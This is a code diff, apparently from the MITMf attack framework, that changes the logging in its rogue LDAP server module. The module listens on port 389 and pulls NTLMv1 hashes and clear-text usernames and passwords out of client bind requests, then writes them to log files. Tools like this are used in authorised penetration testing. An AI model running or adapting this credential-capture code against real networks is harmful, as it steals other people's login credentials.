@@ -6,22 +6,24 @@ import re
 from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
 from LDAPPackets import *
 from core.responder.common import *
+from core.logger import logger
 
-mitmf_logger = logging.getLogger("mitmf")
+formatter = logging.Formatter("%(asctime)s [LDAPserver] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+log = logger().setup_logger("LDAPserver", formatter)
 
-class LDAPServer():
+class LDAPserver():
 
 	def start(self, chal):
 		global Challenge; Challenge = chal
 
 		try:
-			mitmf_logger.debug("[LDAPServer] online")
+			log.debug("online")
 			server = ThreadingTCPServer(("0.0.0.0", 389), LDAP)
-			t = threading.Thread(name="LDAPServer", target=server.serve_forever)
+			t = threading.Thread(name="LDAPserver", target=server.serve_forever)
 			t.setDaemon(True)
 			t.start()
 		except Exception as e:
-			mitmf_logger.error("[LDAPServer] Error starting on port {}: {}".format(389, e))
+			log.error("Error starting on port {}: {}".format(389, e))
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
@@ -60,11 +62,11 @@ def ParseLDAPHash(data,client):
 		Outfile = "./logs/responder/LDAP-NTLMv1-"+client+".txt"
 		WriteData(Outfile,writehash,User+"::"+Domain)
 		#print "[LDAP] NTLMv1 complete hash is :", writehash
-		mitmf_logger.info('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
+		log.info('NTLMv1 complete hash is :%s'%(writehash))
 	if LMhashLen <2 :
-		Message = '[LDAPServer] LDAP Anonymous NTLM authentication, ignoring..'
+		Message = 'LDAP Anonymous NTLM authentication, ignoring..'
 		#print Message
-		mitmf_logger.info(Message)
+		log.info(Message)
 
 def ParseNTLM(data,client):
 	Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
@@ -93,8 +95,8 @@ def ParseLDAPPacket(data,client):
 				Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
 				#print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
 				outfile = "./logs/responder/LDAP-Clear-Text-Password-"+client+".txt"
-				WriteData(outfile,'[LDAPServer] User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
-				mitmf_logger.info('[LDAPServer] User: %s Password: %s'%(UserDomain,Password))
+				WriteData(outfile,'User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
+				log.info('User: %s Password: %s'%(UserDomain,Password))
 			if sasl == "\xA3":
 				buff = ParseNTLM(data,client)
 				return buff
@@ -102,7 +104,7 @@ def ParseLDAPPacket(data,client):
 			buff = ParseSearch(data)
 			return buff
 		else:
-			mitmf_logger.info('[LDAPServer] Operation not supported')
+			log.info('Operation not supported')
 
 #LDAP Server Class
 class LDAP(BaseRequestHandler):
